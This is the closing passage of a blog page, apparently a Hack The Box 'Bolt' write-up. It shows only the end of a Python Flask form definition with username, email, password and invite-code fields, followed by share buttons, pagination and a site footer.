</span></span><span style="display:flex;"><span>    username <span style="color:#ff79c6">=</span> TextField(<span style="color:#f1fa8c">&#39;Username&#39;</span>     , <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;username_create&#39;</span> , validators<span style="color:#ff79c6">=</span>[DataRequired()])
</span></span><span style="display:flex;"><span>    email    <span style="color:#ff79c6">=</span> TextField(<span style="color:#f1fa8c">&#39;Email&#39;</span>        , <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;email_create&#39;</span>    , validators<span style="color:#ff79c6">=</span>[DataRequired(), Email()])
</span></span><span style="display:flex;"><span>    password <span style="color:#ff79c6">=</span> PasswordField(<span style="color:#f1fa8c">&#39;Password&#39;</span> , <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;pwd_create&#39;</span>      , validators<span style="color:#ff79c6">=</span>[DataRequired()])
</span></span><span style="display:flex;"><span>    invite_code <span style="color:#ff79c6">=</span> TextField(<span style="color:#f1fa8c">&#39;Invite Code&#39;</span>, <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;invite_code&#39;</span>    , validators<span style="color:#ff79c6">=</span>[DataRequired()])
</span></span></code></pre></td></tr></table>
</div>
</div>
      </div>
    </article>

    <hr />
      <div class="sharing-buttons">
        
<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-bolt%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-bolt%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Htb%20Bolt&amp;caption=Htb%20Bolt&amp;canonicalUrl=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-bolt%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="mailto:?subject=Htb%20Bolt&amp;body=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-bolt%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-bolt%2f&amp;media=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-bolt%2f;description=Htb%20Bolt" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-bolt%2f&amp;title=Htb%20Bolt&amp;summary=Htb%20Bolt&amp;source=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-bolt%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-bolt%2f&amp;resubmit=true&amp;title=Htb%20Bolt" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-bolt%2f;title=Htb%20Bolt" target="_blank" rel="noopener" aria-label="" title="Share on xing">
  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="whatsapp://send?text=Htb%20Bolt%20https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-bolt%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-bolt%2f&amp;t=Htb%20Bolt" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Htb%20Bolt&amp;url=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-bolt%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
    </div>
  </div>
</a>

      </div>
          <hr />

    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h"></span>
        </div>

        <div class="pagination__buttons">
          
            <a href="https://0xade1.github.io/devdraft/posts/2021/10/htb-writer/" class="button previous">
                <span class="button__icon">â†</span>
                <span class="button__text">Htb Writer</span>
            </a>
          

          
            <a href="https://0xade1.github.io/devdraft/posts/2022/08/picoctf2019/" class="button next">
                <span class="button__text">PicoCTF2019</span>
                <span class="button__icon">â†’</span>
            </a>
          
        </div>
      </div>
    

      <hr />

        










  </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2022</span>
            
            <span><a href="https://0xade1.github.io/devdraft/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Made with &#10084;</span>
          </div>
    </div>
</footer>

            
        </div>

        



<script type="text/javascript" src="https://0xade1.github.io/devdraft/bundle.min.7015b843bafc394b6094818242f153559f5ca94b331b9faaf6132652c59619aefe60ae36e1637f7ee14fd953892639f466c25095c36d42203a1c195313e93212.js" integrity="sha512-cBW4Q7r8OUtglIGCQvFTVZ9cqUszG5&#43;q9hMmUsWWGa7&#43;YK424WN/fuFP2VOJJjn0ZsJQlcNtQiA6HBlTE&#43;kyEg=="></script>



    </body>
</html>
